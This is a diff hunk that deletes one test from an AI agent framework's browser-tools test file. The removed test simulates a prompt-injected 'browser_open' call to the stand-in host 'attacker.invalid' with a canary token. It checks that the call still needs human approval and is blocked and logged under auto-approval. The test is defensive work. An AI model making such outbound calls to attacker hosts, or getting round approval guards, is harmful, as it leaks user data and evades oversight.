@@ -11,33 +11,6 @@ namespace WindowsAxon.Agent.Tests.Tools;
 
 public sealed class BrowserToolsTests
 {
-    [Fact]
-    public async Task Browser_open_is_guarded_even_with_auto_approval_enabled()
-    {
-        var catalog = new ToolCatalog();
-        await using var tools = new BrowserTools(Path.GetTempPath());
-        ToolRegistration.Add(catalog, tools);
-        var entry = catalog.Find("browser_open")!;
-        var policy = new WindowsAxon.Agent.Approval.ApprovalPolicy(catalog, [], autoApprove: true);
-        var call = new FunctionCallContent("injection", "browser_open", new Dictionary<string, object?>
-        {
-            ["url"] = "https://attacker.invalid/TEST_CANARY_9"
-        });
-        policy.AllowForConversation(call);
-
-        Assert.True(entry.Outbound);
-        Assert.True(entry.NeedsApproval);
-        Assert.IsType<ApprovalRequiredAIFunction>(catalog.BuildAgentTools(e => e.Function).Single(t => t.Name == entry.Name));
-        Assert.Equal(WindowsAxon.Agent.Approval.ApprovalOutcome.Ask, policy.Decide(call).Outcome);
-        var audit = new ListAuditLog();
-        var guard = new GuardedAIFunction(entry,
-            new ToolSelectionState(catalog, 14) { AllToolsActive = true }, new CallTracker(), new ApprovalLedger(), audit);
-
-        Assert.Equal(GuardedAIFunction.ApprovalRequiredMessage,
-            await guard.InvokeAsync(new AIFunctionArguments(call.Arguments!), TestContext.Current.CancellationToken));
-        Assert.Contains(audit.Entries, e => e is { Kind: "call", Status: "blocked" });
-    }
-
     [Theory]
     [InlineData(false)]
     [InlineData(true)]
